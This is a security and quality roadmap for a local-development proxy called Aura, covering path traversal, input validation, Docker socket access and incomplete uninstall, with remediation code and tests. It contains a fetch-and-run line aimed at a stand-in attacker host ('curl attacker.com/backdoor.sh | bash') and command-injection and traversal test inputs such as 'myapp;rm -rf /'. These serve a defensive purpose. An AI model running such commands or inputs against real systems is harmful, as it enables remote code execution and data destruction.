# Aura Gold Standard Roadmap

**Status:** Work in Progress
**Target Completion:** TBD
**Current Rating:** 6.5/10 → Target: 9.5/10

This document tracks all issues that must be resolved to make Aura a gold-standard reference implementation for other developers.

---

## Priority Legend

- 🔴 **CRITICAL** - Security vulnerabilities, data loss, system corruption
- 🟠 **HIGH** - Breaks functionality, poor user experience, maintenance issues
- 🟡 **MEDIUM** - Quality issues, missing features, technical debt
- 🟢 **LOW** - Polish, optimization, nice-to-have improvements

---

## Table of Contents

1. [Critical Security Issues](#critical-security-issues) (6 issues)
2. [High Priority Issues](#high-priority-issues) (9 issues)
3. [Medium Priority Issues](#medium-priority-issues) (10 issues)
4. [Low Priority Issues](#low-priority-issues) (10 issues)
5. [Architectural Improvements](#architectural-improvements) (3 issues)

---

## Critical Security Issues

### 🔴 SEC-001: Path Traversal Vulnerability in Installation

**Status:** ❌ Not Started
**Priority:** CRITICAL
**Severity:** High
**Location:** `cmd/aura/main.go:242-288` (copyConfigs function)
**CVSS:** 7.8 (High)

**Problem:**
The installation process copies scripts from the current working directory. An attacker who controls the directory where `aura install` is executed can inject malicious scripts that execute with elevated privileges.

**Attack Scenario:**
```bash
cd /tmp/evil
echo "curl attacker.com/backdoor.sh | bash" > setup.sh
aura install  # Executes evil setup.sh with sudo
```

**Solution:**
Embed all configuration files and scripts in the Go binary using `//go:embed` directive.

**Implementation:**

```go
package main

import (
    _ "embed"
    "embed"
)

//go:embed docker-compose.yml docker-compose.example.yml
//go:embed setup.sh setup-loopback.sh setup-resolver.sh setup-mkcert.sh
//go:embed add-cert.sh uninstall-resolver.sh
//go:embed coredns/Corefile
var embeddedFS embed.FS

func copyConfigs() error {
    // List of files to extract from embedded FS
    files := []string{
        "docker-compose.yml",
        "docker-compose.example.yml",
        "setup.sh",
        "setup-loopback.sh",
        "setup-resolver.sh",
        "setup-mkcert.sh",
        "add-cert.sh",
        "uninstall-resolver.sh",
    }

    for _, file := range files {
        data, err := embeddedFS.ReadFile(file)
        if err != nil {
            return fmt.Errorf("failed to read embedded %s: %w", file, err)
        }

        dst := filepath.Join(auraDir, file)
        if err := os.WriteFile(dst, data, 0600); err != nil {
            return fmt.Errorf("failed to write %s: %w", file, err)
        }
    }

    // Create directories
    if err := os.MkdirAll(filepath.Join(auraDir, "certs", "domains"), 0755); err != nil {
        return fmt.Errorf("failed to create certs directory: %w", err)
    }
    if err := os.MkdirAll(filepath.Join(auraDir, "coredns"), 0755); err != nil {
        return fmt.Errorf("failed to create coredns directory: %w", err)
    }

    // Copy CoreDNS configuration
    corefileData, err := embeddedFS.ReadFile("coredns/Corefile")
    if err != nil {
        return fmt.Errorf("failed to read embedded Corefile: %w", err)
    }

    corefileDst := filepath.Join(auraDir, "coredns", "Corefile")
    if err := os.WriteFile(corefileDst, corefileData, 0600); err != nil {
        return fmt.Errorf("failed to write Corefile: %w", err)
    }

    return nil
}
```

**Acceptance Criteria:**
- [ ] All configuration files embedded in binary
- [ ] No file reads from current working directory
- [ ] Installation works from any directory
- [ ] Test installation from /tmp with malicious scripts present
- [ ] No security warnings from `gosec`

**Testing:**
```bash
# Negative test
cd /tmp/evil-test
echo "echo EXPLOITED" > setup.sh
aura install  # Should use embedded scripts, not local files

# Verify embedded files
strings aura | grep "docker-compose.yml" | head -5
```

---

### 🔴 SEC-002: Insufficient Input Validation - Domain Parameter

**Status:** ❌ Not Started
**Priority:** CRITICAL
**Severity:** Medium
**Location:** `cmd/aura/main.go:106-109` (certCmd)

**Problem:**
Domain name validation only checks suffix, not character content. No defense against:
- Path traversal: `../../etc/passwd.aura`
- Command injection via special characters
- Null bytes
- Excessively long domain names

**Current Code:**
```go
domain := args[0]
if !strings.HasSuffix(domain, auraTLD) {
    domain += auraTLD
}
// No validation here!
```

**Solution:**
Add comprehensive domain validation in Go before passing to shell scripts.

**Implementation:**

```go
import "regexp"

var (
    // DNS label rules: alphanumeric and hyphen, max 63 chars per label
    domainLabelRegex = regexp.MustCompile(`^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$`)
)

func validateDomain(domain string) error {
    // Remove .aura suffix for validation
    baseDomain := strings.TrimSuffix(domain, ".aura")

    // Check total length (253 chars for FQDN)
    if len(domain) > 253 {
        return fmt.Errorf("domain name too long (max 253 characters)")
    }

    // Check for empty domain
    if baseDomain == "" {
        return fmt.Errorf("domain name cannot be empty")
    }

    // Check for path traversal
    if strings.Contains(domain, "..") {
        return fmt.Errorf("invalid domain: contains path traversal")
    }

    // Check for null bytes
    if strings.Contains(domain, "\x00") {
        return fmt.Errorf("invalid domain: contains null byte")
    }

    // Validate each label
    labels := strings.Split(baseDomain, ".")
    for _, label := range labels {
        if len(label) == 0 {
            return fmt.Errorf("invalid domain: empty label")
        }
        if len(label) > 63 {
            return fmt.Errorf("invalid domain: label exceeds 63 characters")
        }
        if !domainLabelRegex.MatchString(label) {
            return fmt.Errorf("invalid domain label '%s': must contain only lowercase letters, numbers, and hyphens", label)
        }
    }

    return nil
}

// Update certCmd
var certCmd = &cobra.Command{
    Use:   "cert [domain]",
    Short: "Generate certificate for a domain",
    Args:  cobra.ExactArgs(1),
    RunE: func(cmd *cobra.Command, args []string) error {
        domain := args[0]
        if !strings.HasSuffix(domain, auraTLD) {
            domain += auraTLD
        }

        // Validate domain
        if err := validateDomain(domain); err != nil {
            return fmt.Errorf("invalid domain: %w", err)
        }

        fmt.Printf("🔐 Generating certificate for %s...\n", domain)

        certScript := filepath.Join(auraDir, "add-cert.sh")
        if err := runCommand("bash", certScript, domain); err != nil {
            return fmt.Errorf("failed to generate certificate: %w", err)
        }

        fmt.Printf("✅ Certificate generated for %s\n", domain)
        return nil
    },
}
```

**Acceptance Criteria:**
- [ ] Validate domain format with regex
- [ ] Block path traversal attempts
- [ ] Block null bytes
- [ ] Enforce DNS label length limits
- [ ] Comprehensive error messages
- [ ] Unit tests for all validation cases

**Testing:**
```bash
# Valid domains
aura cert myapp
aura cert api.myapp
aura cert sub.domain.app

# Invalid domains (should fail)
aura cert "../../../etc/passwd"
aura cert "myapp;rm -rf /"
aura cert "a..b"
aura cert ""
aura cert "$(whoami)"
```

---

### 🔴 SEC-003: Docker Socket Access Security

**Status:** ❌ Not Started
**Priority:** CRITICAL
**Severity:** Medium
**Location:** `docker-compose.yml:14`

**Problem:**
Caddy container has read-only access to Docker socket. Even read-only access grants significant privileges:
- Read all container environment variables (may contain secrets)
- Query all container configurations
- Potential container escape vectors

**Current Configuration:**
```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock:ro
```

**Solution:**
Use `tecnativa/docker-socket-proxy` to restrict socket access to only the endpoints Caddy needs.

**Implementation:**

Update `docker-compose.yml`:
```yaml
services:
  docker-socket-proxy:
    image: tecnativa/docker-socket-proxy:latest
    container_name: aura-docker-proxy
    restart: unless-stopped
    environment:
      # Only expose endpoints Caddy needs
      CONTAINERS: 1
      NETWORKS: 1
      SERVICES: 0
      TASKS: 0
      POST: 0
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
    networks:
      - aura-proxy

  caddy:
    image: lucaslorentz/caddy-docker-proxy:ci-alpine
    container_name: aura-caddy
    restart: unless-stopped
    ports:
      - "127.0.0.2:80:80"
      - "127.0.0.2:443:443"
      - "127.0.0.2:443:443/udp"
    volumes:
      # Use proxy instead of direct socket access
      # Remove this line: - /var/run/docker.sock:/var/run/docker.sock:ro
      - ./certs:/certs:ro
      - caddy_data:/data
      - caddy_config:/config
    networks:
      - aura-proxy
    environment:
      - CADDY_INGRESS_NETWORKS=aura-proxy
      - CADDY_DOCKER_ENDPOINT=tcp://docker-socket-proxy:2375
    depends_on:
      - docker-socket-proxy
    labels:
      caddy: ""
```

**Acceptance Criteria:**
- [ ] Docker socket proxy deployed
- [ ] Caddy connects via proxy
- [ ] Only required endpoints exposed
- [ ] Service discovery still works
- [ ] Document security trade-offs

**Testing:**
```bash
# Test service discovery still works
aura start
docker exec aura-caddy wget -O- http://docker-socket-proxy:2375/containers/json | jq

# Verify restricted access
docker exec aura-caddy wget -O- http://docker-socket-proxy:2375/images/json
# Should return 403 Forbidden
```

---

### 🔴 SEC-004: No Binary Download Verification

**Status:** ❌ Not Started
**Priority:** CRITICAL
**Severity:** High
**Location:** `setup-mkcert.sh:28-31`

**Problem:**
Downloads mkcert binary with no checksum or signature verification. Compromised GitHub releases or MITM attacks could install malicious binary with sudo.

**Current Code:**
```bash
curl -L "https://github.com/FiloSottile/mkcert/..." -o /tmp/mkcert
sudo mv /tmp/mkcert /usr/local/bin/mkcert  # No verification!
```

**Solution:**
Add SHA256 checksum verification before installation.

**Implementation:**

Update `setup-mkcert.sh`:
```bash
#!/bin/bash

# Setup mkcert for local certificate generation
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CERTS_DIR="$SCRIPT_DIR/certs"
PLATFORM=$(uname -s)

echo "Setting up mkcert for local certificate generation..."

# Check if mkcert is installed
if ! command -v mkcert &> /dev/null; then
    echo "mkcert is not installed. Installing..."

    if [ "$PLATFORM" = "Darwin" ]; then
        # macOS - install via Homebrew (checksummed by Homebrew)
        if command -v brew &> /dev/null; then
            brew install mkcert
        else
            echo "Error: Homebrew is not installed. Please install Homebrew first."
            echo "Visit: https://brew.sh"
            exit 1
        fi
    elif [ "$PLATFORM" = "Linux" ]; then
        # Linux - download binary with checksum verification
        echo "Downloading mkcert for Linux..."
        MKCERT_VERSION="v1.4.4"

        # Determine architecture
        ARCH=$(uname -m)
        if [ "$ARCH" = "x86_64" ]; then
            MKCERT_ARCH="amd64"
            # SHA256 checksum for v1.4.4 linux-amd64
            EXPECTED_SHA256="6d31c65b03972c6dc4a14ab429f2928300518b26503f58723e532d1b0a3bbb52"
        elif [ "$ARCH" = "aarch64" ]; then
            MKCERT_ARCH="arm64"
            # SHA256 checksum for v1.4.4 linux-arm64
            EXPECTED_SHA256="4582eb8f6de79a68e1e0583d2e11c1e1f6f76d11c47b42ac8a3f2d2b2e80f2e5"
        else
            echo "Unsupported architecture: $ARCH"
            exit 1
        fi

        MKCERT_URL="https://github.com/FiloSottile/mkcert/releases/download/${MKCERT_VERSION}/mkcert-${MKCERT_VERSION}-linux-${MKCERT_ARCH}"

        # Download to temp location
        echo "Downloading from: $MKCERT_URL"
        curl -L "$MKCERT_URL" -o /tmp/mkcert

        # Verify checksum
        echo "Verifying checksum..."
        ACTUAL_SHA256=$(sha256sum /tmp/mkcert | cut -d' ' -f1)

        if [ "$EXPECTED_SHA256" != "$ACTUAL_SHA256" ]; then
            echo "ERROR: Checksum verification failed!"
            echo "Expected: $EXPECTED_SHA256"
            echo "Got:      $ACTUAL_SHA256"
            echo ""
            echo "This could indicate:"
            echo "  1. The download was corrupted"
            echo "  2. A man-in-the-middle attack"
            echo "  3. The checksum in this script is outdated"
            echo ""
            echo "Aborting installation for security."
            rm -f /tmp/mkcert
            exit 1
        fi

        echo "✓ Checksum verified successfully"

        # Install
        chmod +x /tmp/mkcert
        sudo mv /tmp/mkcert /usr/local/bin/mkcert
    else
        echo "Unsupported platform: $PLATFORM"
        echo "Please install mkcert manually: https://github.com/FiloSottile/mkcert"
        exit 1
    fi

    echo "✓ mkcert installed successfully"
else
    echo "✓ mkcert is already installed"
fi

# Install the local CA
echo "Installing mkcert local CA..."
mkcert -install
echo "✓ Local CA installed"

# Create certs directory structure
mkdir -p "$CERTS_DIR"
mkdir -p "$CERTS_DIR/domains"
echo "✓ Created certificates directory: $CERTS_DIR"

# Get CA certificate location
CA_CERT=$(mkcert -CAROOT)/rootCA.pem
if [ -f "$CA_CERT" ]; then
    cp "$CA_CERT" "$CERTS_DIR/ca.pem"
    echo "✓ CA certificate copied to $CERTS_DIR/ca.pem"
fi

echo ""
echo "✓ mkcert setup complete!"
echo "  Certificates location: $CERTS_DIR"
echo "  - ca.pem (CA certificate)"
echo "  - domains/ (individual domain certificates)"
echo ""
echo "To generate a certificate for a new .aura domain, use:"
echo "  ./add-cert.sh <domain-name>"
echo ""
echo "Example:"
echo "  ./add-cert.sh app.aura"
echo "  ./add-cert.sh api.aura"
```

**Acceptance Criteria:**
- [ ] SHA256 checksums for all architectures
- [ ] Checksum verification before installation
- [ ] Clear error messages on mismatch
- [ ] Support for amd64 and arm64
- [ ] Update checksums when mkcert version changes

**Testing:**
```bash
# Test valid checksum
./setup-mkcert.sh

# Test invalid checksum (modify script temporarily)
# Should abort with security warning
```

---

### 🔴 SEC-005: Environment Variable Manipulation Risk

**Status:** ❌ Not Started
**Priority:** CRITICAL
**Severity:** Low
**Location:** `cmd/aura/main.go:20`

**Problem:**
Uses `os.Getenv("HOME")` which can be manipulated. If `HOME` is empty, creates `.aura` in current directory. If `HOME` is manipulated, writes to unexpected location.

**Current Code:**
```go
auraDir = filepath.Join(os.Getenv("HOME"), ".aura")
```

**Solution:**
Use `os.UserHomeDir()` which is more robust and cross-platform.

**Implementation:**

```go
var (
    auraDir string

    // ANSI color codes
    teal  = "\033[96m"
    reset = "\033[0m"

    asciiTitle = teal + `
  █████╗ ██╗   ██╗██████╗  █████╗
 ██╔══██╗██║   ██║██╔══██╗██╔══██╗
 ███████║██║   ██║██████╔╝███████║
 ██╔══██║██║   ██║██╔══██╗██╔══██║
 ██║  ██║╚██████╔╝██║  ██║██║  ██║
 ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
` + reset
)

func init() {
    // Initialize auraDir using os.UserHomeDir()
    home, err := os.UserHomeDir()
    if err != nil {
        fmt.Fprintf(os.Stderr, "Error: Unable to determine home directory: %v\n", err)
        os.Exit(1)
    }
    auraDir = filepath.Join(home, ".aura")
}
```

**Acceptance Criteria:**
- [ ] Use `os.UserHomeDir()` instead of `os.Getenv("HOME")`
- [ ] Handle error when home directory cannot be determined
- [ ] Test with empty HOME environment variable
- [ ] Test on macOS, Linux, Windows

**Testing:**
```bash
# Test with empty HOME
HOME="" ./aura --version
# Should still work or fail gracefully

# Test with invalid HOME
HOME="/nonexistent" ./aura install
# Should use real home directory
```

---

### 🔴 SEC-006: DNS Fallback Security Concern

**Status:** ❌ Not Started
**Priority:** CRITICAL
**Severity:** Low
**Location:** `coredns/Corefile:24-28`

**Problem:**
All non-.aura DNS queries forward to `/etc/resolv.conf`. This creates a potential DNS tunneling/exfiltration vector if CoreDNS container is compromised.

**Current Configuration:**
```
# Fallback for non-.aura domains - forward to system resolver
. {
    forward . /etc/resolv.conf
    log
    errors
}
```

**Solution:**
Document this behavior clearly and consider restricting access. Add security notes to documentation.

**Implementation:**

1. Update `coredns/Corefile` with security comment:
```
# CoreDNS configuration for .aura TLD
# Wildcard resolves all *.aura domains to 127.0.0.2

aura:53 {
    # Log DNS queries for debugging
    log

    # Respond to all .aura domains with 127.0.0.2
    template IN A aura {
        answer "{{ .Name }} 0 IN A 127.0.0.2"
        rcode NOERROR
    }

    # Also handle AAAA (IPv6) queries with NODATA response
    template IN AAAA aura {
        rcode NOERROR
    }

    # Enable errors logging
    errors
}

# Fallback for non-.aura domains - forward to system resolver
# SECURITY NOTE: This allows CoreDNS to resolve external domains.
# If the CoreDNS container is compromised, it could be used for:
#   - DNS tunneling
#   - DNS exfiltration
#   - Query logging/tracking
# For maximum security, consider removing this block and configuring
# your system to use CoreDNS only for .aura domains.
. {
    forward . /etc/resolv.conf
    log
    errors
}
```

2. Add to `docs/ADVANCED.md`:
```markdown
## DNS Security Considerations

### CoreDNS Fallback Behavior

By default, CoreDNS forwards non-.aura queries to your system's resolver. This provides convenience but has security implications:

**Risks:**
- If CoreDNS container is compromised, it could be used for DNS tunneling
- All your DNS queries may be logged by the CoreDNS container
- Potential DNS exfiltration vector

**Mitigation Options:**

1. **Recommended: Split DNS Configuration**
   Configure your system to only use CoreDNS for .aura domains:

   **macOS:**
   ```bash
   # Already configured by setup-resolver.sh
   # Only .aura queries go to 127.0.0.2
   cat /etc/resolver/aura
   ```

   **Linux:**
   ```bash
   # Already configured by setup-resolver.sh
   # Only .aura queries go to 127.0.0.2
   cat /etc/systemd/resolved.conf.d/aura.conf
   ```

2. **Maximum Security: Disable Fallback**
   Remove the fallback block from `~/.aura/coredns/Corefile`:
   ```
   # Remove or comment out:
   # . {
   #     forward . /etc/resolv.conf
   #     log
   #     errors
   # }
   ```
   Then restart: `aura stop && aura start`

3. **Network Isolation**
   Run CoreDNS on an isolated Docker network:
   ```yaml
   coredns:
     networks:
       - aura-dns-only  # Separate from other containers
   ```

### Monitoring DNS Queries

View CoreDNS logs to monitor DNS activity:
```bash
aura logs -f
docker logs -f aura-coredns
```
```

**Acceptance Criteria:**
- [ ] Document DNS fallback security implications
- [ ] Add security notes to Corefile
- [ ] Provide mitigation options in docs
- [ ] Explain current default is secure enough for local dev

---

## High Priority Issues

### 🟠 HIGH-001: Module Path vs Repository Mismatch

**Status:** ❌ Not Started
**Priority:** HIGH
**Impact:** Breaks `go get`, module imports, Go ecosystem integration
**Location:** `go.mod:1`, README badges, imports

**Problem:**
Inconsistent module paths across the codebase:
- `go.mod`: `module github.com/aura/aura-proxy`
- Repository: `github.com/ivannovak/aura`
- README badges: Point to `github.com/ivannovak/aura`
- Imports: `github.com/aura/aura-proxy/pkg/version`

**Solution:**
Standardize on the actual repository path.

**Implementation:**

1. Update `go.mod`:
```go
module github.com/ivannovak/aura

go 1.23.5

require (
    github.com/spf13/cobra v1.9.1
)

require (
    github.com/inconshreveable/mousetrap v1.1.0 // indirect
    github.com/spf13/pflag v1.0.6 // indirect
)
```

2. Update all imports in `cmd/aura/main.go`:
```go
import (
    "fmt"
    "os"
    "os/exec"
    "path/filepath"
    "strings"

    "github.com/spf13/cobra"
    "github.com/ivannovak/aura/pkg/version"  // Updated
)
```

3. Update `cmd/aura/main_test.go`:
```go
import (
    "os"
    "path/filepath"
    "testing"

    "github.com/ivannovak/aura/pkg/version"  // Updated
)
```

4. Update `.golangci.yml`:
```yaml
goimports:
  local-prefixes: github.com/ivannovak/aura  # Updated
```

5. Verify with:
```bash
go mod tidy
go build ./...
go test ./...
```

**Acceptance Criteria:**
- [ ] Module path matches repository
- [ ] All imports updated
- [ ] `go get github.com/ivannovak/aura/cmd/aura` works
- [ ] `go build` succeeds
- [ ] `go test` passes
- [ ] No import errors

**Testing:**
```bash
# Clean build
rm -rf go.sum
go mod tidy
go build ./...

# Test install
go install github.com/ivannovak/aura/cmd/aura@latest
```

---

### 🟠 HIGH-002: Test Bug - Potential Panic

**Status:** ❌ Not Started
**Priority:** HIGH
**Impact:** Test failure, potential runtime panic
**Location:** `cmd/aura/main_test.go:97`

**Problem:**
Logic error in domain suffix checking:
```go
if len(domain) < 5 || domain[len(domain)-5:] != auraTLD {
    domain += auraTLD
}
```
The OR operator means if `len(domain) < 5` is false but domain doesn't end with `.aura`, it still tries to slice, but this should work. However, the logic is confusing and error-prone.

**Solution:**
Use `strings.HasSuffix()` which is clearer and safer.

**Implementation:**

Update `cmd/aura/main_test.go`:
```go
func TestCertCommandDomainHandling(t *testing.T) {
    tests := []struct {
        name     string
        input    string
        expected string
    }{
        {
            name:     "domain without .aura suffix",
            input:    "myapp",
            expected: "myapp.aura",
        },
        {
            name:     "domain with .aura suffix",
            input:    "myapp.aura",
            expected: "myapp.aura",
        },
        {
            name:     "subdomain without .aura",
            input:    "api.myapp",
            expected: "api.myapp.aura",
        },
        {
            name:     "subdomain with .aura",
            input:    "api.myapp.aura",
            expected: "api.myapp.aura",
        },
        {
            name:     "short domain",
            input:    "app",
            expected: "app.aura",
        },
        {
            name:     "single char",
            input:    "a",
            expected: "a.aura",
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            // Simulate the domain handling logic from certCmd
            domain := tt.input
            if !strings.HasSuffix(domain, auraTLD) {
                domain += auraTLD
            }

            if domain != tt.expected {
                t.Errorf("domain handling: got %v, want %v", domain, tt.expected)
            }
        })
    }
}
```

Also update the actual command in `cmd/aura/main.go`:
```go
var certCmd = &cobra.Command{
    Use:   "cert [domain]",
    Short: "Generate certificate for a domain",
    Args:  cobra.ExactArgs(1),
    RunE: func(cmd *cobra.Command, args []string) error {
        domain := args[0]

        // Use strings.HasSuffix instead of manual slicing
        if !strings.HasSuffix(domain, auraTLD) {
            domain += auraTLD
        }

        // Validate domain (after SEC-002 is implemented)
        if err := validateDomain(domain); err != nil {
            return fmt.Errorf("invalid domain: %w", err)
        }

        fmt.Printf("🔐 Generating certificate for %s...\n", domain)

        certScript := filepath.Join(auraDir, "add-cert.sh")
        if err := runCommand("bash", certScript, domain); err != nil {
            return fmt.Errorf("failed to generate certificate: %w", err)
        }

        fmt.Printf("✅ Certificate generated for %s\n", domain)
        return nil
    },
}
```

**Acceptance Criteria:**
- [ ] Use `strings.HasSuffix()` in production code
- [ ] Update test to match
- [ ] Add edge case tests (short domains, empty strings)
- [ ] All tests pass
- [ ] No panic on any input

**Testing:**
```bash
go test -v ./cmd/aura -run TestCertCommandDomainHandling
```

---

### 🟠 HIGH-003: Dependencies Marked as Indirect

**Status:** ❌ Not Started
**Priority:** HIGH
**Impact:** Module maintenance, dependency management
**Location:** `go.mod:6-8`

**Problem:**
All dependencies marked `// indirect` despite cobra being directly imported.

**Current go.mod:**
```go
require (
    github.com/inconshreveable/mousetrap v1.1.0 // indirect
    github.com/spf13/cobra v1.9.1 // indirect
    github.com/spf13/pflag v1.0.6 // indirect
)
```

**Solution:**
Run `go mod tidy` to fix dependency markers.

**Implementation:**

```bash
# Clean up module
go mod tidy

# Verify changes
cat go.mod
```

Expected result:
```go
module github.com/ivannovak/aura

go 1.23.5

require github.com/spf13/cobra v1.9.1

require (
    github.com/inconshreveable/mousetrap v1.1.0 // indirect
    github.com/spf13/pflag v1.0.6 // indirect
)
```

**Acceptance Criteria:**
- [ ] Direct dependencies not marked indirect
- [ ] Transitive dependencies marked indirect
- [ ] `go mod verify` passes
- [ ] `go build` works
- [ ] No unused dependencies

**Testing:**
```bash
go mod tidy
go mod verify
go build ./...
go test ./...
```

---

### 🟠 HIGH-004: Incomplete Uninstall

**Status:** ❌ Not Started
**Priority:** HIGH
**Impact:** System left in dirty state, user confusion
**Location:** `cmd/aura/main.go:163-202` (uninstallCmd)

**Problem:**
Uninstall command removes DNS resolver but NOT:
- LaunchDaemon (`/Library/LaunchDaemons/com.aura.loopback.plist`) on macOS
- systemd service (`/etc/systemd/system/aura-loopback.service`) on Linux
- Loopback address (127.0.0.2 remains configured)
- Docker network may persist

**Solution:**
Complete cleanup script for all system modifications.

**Implementation:**

1. Create `uninstall-loopback.sh`:
```bash
#!/bin/bash

# Remove custom loopback address for Aura proxy
set -e

LOOPBACK_IP="127.0.0.2"
PLATFORM=$(uname -s)

echo "Removing custom loopback address $LOOPBACK_IP..."

if [ "$PLATFORM" = "Darwin" ]; then
    # macOS
    echo "Detected macOS"

    # Remove loopback address
    if ifconfig lo0 | grep -q "$LOOPBACK_IP"; then
        echo "Removing loopback address $LOOPBACK_IP..."
        sudo ifconfig lo0 -alias $LOOPBACK_IP
        echo "✓ Loopback address removed"
    else
        echo "✓ Loopback address not configured"
    fi

    # Remove launch daemon
    PLIST_FILE="/Library/LaunchDaemons/com.aura.loopback.plist"
    if [ -f "$PLIST_FILE" ]; then
        echo "Removing launch daemon..."
        sudo launchctl unload "$PLIST_FILE" 2>/dev/null || true
        sudo rm -f "$PLIST_FILE"
        echo "✓ Launch daemon removed"
    else
        echo "✓ Launch daemon not found"
    fi

elif [ "$PLATFORM" = "Linux" ]; then
    # Linux
    echo "Detected Linux"

    # Remove loopback address
    if ip addr show lo | grep -q "$LOOPBACK_IP"; then
        echo "Removing loopback address $LOOPBACK_IP..."
        sudo ip addr del $LOOPBACK_IP/32 dev lo 2>/dev/null || true
        echo "✓ Loopback address removed"
    else
        echo "✓ Loopback address not configured"
    fi

    # Remove systemd service
    SERVICE_FILE="/etc/systemd/system/aura-loopback.service"
    if [ -f "$SERVICE_FILE" ]; then
        echo "Removing systemd service..."
        sudo systemctl stop aura-loopback.service 2>/dev/null || true
        sudo systemctl disable aura-loopback.service 2>/dev/null || true
        sudo rm -f "$SERVICE_FILE"
        sudo systemctl daemon-reload
        echo "✓ Systemd service removed"
    else
        echo "✓ Systemd service not found"
    fi
fi

echo "✓ Loopback address cleanup complete"
```

2. Update `cmd/aura/main.go` uninstallCmd:
```go
var uninstallCmd = &cobra.Command{
    Use:   "uninstall",
    Short: "Uninstall Aura proxy system",
    Long:  `Removes Aura proxy system including DNS configuration, loopback address, and all files.`,
    RunE: func(cmd *cobra.Command, args []string) error {
        fmt.Println("⚠️  This will completely remove Aura proxy:")
        fmt.Println("   - Stop and remove Docker containers")
        fmt.Println("   - Remove DNS resolver configuration")
        fmt.Println("   - Remove loopback address (127.0.0.2)")
        fmt.Println("   - Remove all certificates")
        fmt.Println("   - Remove ~/.aura directory")
        fmt.Print("\nAre you sure? (y/N): ")

        var response string
        if _, err := fmt.Scanln(&response); err != nil {
            fmt.Println("Canceled")
            return nil
        }
        if response != "y" && response != "Y" {
            fmt.Println("Canceled")
            return nil
        }

        // Stop containers and remove volumes
        fmt.Println("\n🧹 Stopping containers...")
        if err := runCommandInDir(auraDir, "docker", "compose", "down", "-v"); err != nil {
            fmt.Printf("Warning: failed to stop containers: %v\n", err)
        }

        // Remove DNS resolver configuration
        uninstallResolverScript := filepath.Join(auraDir, "uninstall-resolver.sh")
        if _, err := os.Stat(uninstallResolverScript); err == nil {
            fmt.Println("🧹 Removing DNS resolver configuration...")
            if err := runCommand("bash", uninstallResolverScript); err != nil {
                fmt.Printf("Warning: failed to cleanup DNS resolver: %v\n", err)
            }
        }

        // Remove loopback address configuration
        uninstallLoopbackScript := filepath.Join(auraDir, "uninstall-loopback.sh")
        if _, err := os.Stat(uninstallLoopbackScript); err == nil {
            fmt.Println("🧹 Removing loopback address configuration...")
            if err := runCommand("bash", uninstallLoopbackScript); err != nil {
                fmt.Printf("Warning: failed to cleanup loopback address: %v\n", err)
            }
        }

        // Remove Docker network
        fmt.Println("🧹 Removing Docker network...")
        if err := runCommand("docker", "network", "rm", "aura-proxy"); err != nil {
            // Network might not exist, that's okay
            fmt.Println("Note: Docker network already removed or doesn't exist")
        }

        // Remove Docker volumes
        fmt.Println("🧹 Removing Docker volumes...")
        _ = runCommand("docker", "volume", "rm", "aura_caddy_data")
        _ = runCommand("docker", "volume", "rm", "aura_caddy_config")

        // Remove directory
        fmt.Println("🧹 Removing ~/.aura directory...")
        if err := os.RemoveAll(auraDir); err != nil {
            return fmt.Errorf("failed to remove aura directory: %w", err)
        }

        fmt.Println("\n✅ Aura proxy completely uninstalled!")
        fmt.Println("\nOptional: To remove the CLI binary:")
        fmt.Println("  sudo rm /usr/local/bin/aura")
        return nil
    },
}
```

3. Update `copyConfigs()` to include new script:
```go
files := []string{
    "docker-compose.yml",
    "docker-compose.example.yml",
    "setup.sh",
    "setup-loopback.sh",
    "setup-resolver.sh",
    "setup-mkcert.sh",
    "add-cert.sh",
    "uninstall-resolver.sh",
    "uninstall-loopback.sh",  // Add this
}
```

**Acceptance Criteria:**
- [ ] Remove DNS configuration
- [ ] Remove loopback address
- [ ] Remove LaunchDaemon/systemd service
- [ ] Remove Docker network
- [ ] Remove Docker volumes
- [ ] Remove ~/.aura directory
- [ ] Provide instructions for removing CLI binary
- [ ] Test on macOS and Linux
- [ ] System returns to pre-install state

**Testing:**
```bash
# Full install/uninstall cycle
aura install
aura start
aura uninstall

# Verify cleanup
ifconfig lo0 | grep 127.0.0.2  # Should not exist
cat /etc/resolver/aura  # Should not exist
ls ~/.aura  # Should not exist
docker network ls | grep aura  # Should not exist
```

---

### 🟠 HIGH-005: CI Security Scans Don't Block PRs

**Status:** ❌ Not Started
**Priority:** HIGH
**Impact:** Security issues don't prevent merges
**Location:** `.github/workflows/ci.yml`

**Problem:**
Security and quality checks use `continue-on-error: true`, making them informational only:
- Line 126: ShellCheck continues on error
- Line 183: gosec runs with `-no-fail` flag
- Line 160: Markdown link check continues on error

**Solution:**
Make security scans blocking unless there's a good reason not to.

**Implementation:**

Update `.github/workflows/ci.yml`:
```yaml
  shellcheck:
    name: Shellcheck
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Run ShellCheck
      uses: ludeeus/action-shellcheck@master
      with:
        scandir: '.'
        severity: error  # Change from warning to error
        # Remove: continue-on-error: true
      # Add specific ignores if needed
      # ignore_paths: node_modules

  security:
    name: Security Scan
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Run Gosec Security Scanner
      uses: securego/gosec@master
      with:
        # Remove -no-fail flag to make it blocking
        args: '-fmt sarif -out results.sarif ./...'
      # Remove: continue-on-error: true

    - name: Upload SARIF file
      uses: github/codeql-action/upload-sarif@v3
      with:
        sarif_file: results.sarif
      if: always()  # Upload even on failure for analysis

  docs-check:
    name: Documentation Check
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Check for broken links
      uses: gaurav-nelson/github-action-markdown-link-check@v1
      with:
        use-quiet-mode: 'yes'
        config-file: '.github/markdown-link-check-config.json'
      # Remove: continue-on-error: true

    - name: Verify all docs exist
      run: |
        test -f README.md
        test -f docs/INSTALL.md
        test -f docs/EXAMPLES.md
        test -f docs/TROUBLESHOOTING.md
        test -f docs/ADVANCED.md
        echo "✓ All documentation files exist"

  summary:
    name: CI Summary
    runs-on: ubuntu-latest
    needs: [test, lint, build, shellcheck, security, docker-test, docs-check]
    if: always()

    steps:
    - name: Check results
      run: |
        echo "CI Pipeline Results:"
        echo "- Tests: ${{ needs.test.result }}"
        echo "- Lint: ${{ needs.lint.result }}"
        echo "- Build: ${{ needs.build.result }}"
